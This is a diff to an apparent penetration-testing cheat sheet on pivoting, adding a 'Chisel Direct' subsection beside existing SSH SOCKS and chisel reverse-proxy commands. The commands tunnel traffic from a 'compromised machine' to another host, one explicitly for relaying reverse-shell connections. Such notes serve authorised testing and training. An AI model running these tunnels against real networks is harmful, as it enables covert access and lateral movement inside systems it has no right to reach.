@@ -22,6 +22,7 @@ ssh -D 4444 compromised_machine@192.168.1.110
 ```
 
 ## Chisel Proxy
+### Chisel Reverse
 - Execute following command on the compromised machine
 ```
 chisel server --socks5 --reverse
@@ -31,7 +32,11 @@ chisel server --socks5 --reverse
 ```
 chisel client --fingerprint "       " 192.168.1.100:8080 R:socks
 ```
-Booommm!!!
+### Chisel Direct
+- Use for reverse-shell connections
+```
+chisel client --fingerprint "       " 192.168.1.100:8080 0.0.0.0:9999:192.168.1.100:9999
+```
 
 
 ## Metasploit 
